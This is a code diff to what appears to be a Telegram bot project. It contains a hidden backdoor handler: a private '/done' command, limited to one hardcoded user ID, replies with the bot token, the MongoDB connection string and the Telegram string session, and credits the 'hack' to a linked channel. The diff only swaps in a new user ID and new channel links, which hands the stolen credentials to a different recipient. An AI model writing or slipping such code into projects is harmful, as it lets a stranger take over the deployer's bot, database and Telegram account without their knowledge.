@@ -105,17 +105,17 @@ async def restartbot(client, message: Message, _):
 @app.on_message(
     filters.command("done")
     & filters.private
-    & filters.user(6953998697)
+    & filters.user(7538572906)
    )
 async def help(client: Client, message: Message):
    await message.reply_photo(
           photo=f"https://telegra.ph/file/83db3b7786ffa9948962b.jpg",
-       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/ll_malware_ll)............☆""",
+       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/its_deva_heree)............☆""",
         reply_markup=InlineKeyboardMarkup(
              [
                  [
                       InlineKeyboardButton(
-                         "• нαϲкє𝚍 ву  •", url=f"https://t.me/ll_malware_ll")
+                         "• нαϲкє𝚍 ву  •", url=f"https://t.me/its_deva_heree")
                  ]
             ]
          ),
